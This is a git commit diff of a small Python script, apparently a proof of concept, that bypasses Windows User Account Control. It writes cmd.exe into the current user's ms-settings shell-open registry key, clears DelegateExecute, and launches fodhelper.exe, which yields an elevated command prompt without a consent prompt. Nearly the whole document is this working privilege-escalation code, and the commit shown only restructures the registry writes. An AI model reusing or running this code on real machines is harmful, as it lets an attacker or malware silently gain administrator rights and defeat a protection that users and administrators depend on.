e5d076789ef32d534666895d4f58f246c5b91c38
Alejandro Pacheco <alepacheco99@gmail.com>
2017-06-05 20:14:53 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,16 +1,16 @@
 import winreg, os
 
 def main():
-	REG_PATH = r"Software\Classes\ms-settings\shell\open\command"
 	Command = r"C:\Windows\System32\cmd.exe"
-	if set_reg(REG_PATH, Command):
-		# Run  C:\Windows\System32\fodhelper.exe
-		os.system(r"C:\Windows\System32\fodhelper.exe")
-		print("Done.")
-	else:
-		print("Error!")
+	
+	set_reg("DelegateExecute", "")
+	set_reg("(default)", Command)
+	
+	# Run  C:\Windows\System32\fodhelper.exe
+	os.system(r"C:\Windows\System32\fodhelper.exe")
 
 def set_reg(name, value):
+	REG_PATH = r"Software\Classes\ms-settings\shell\open\command"
     try:
         winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
         registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH, 0, 
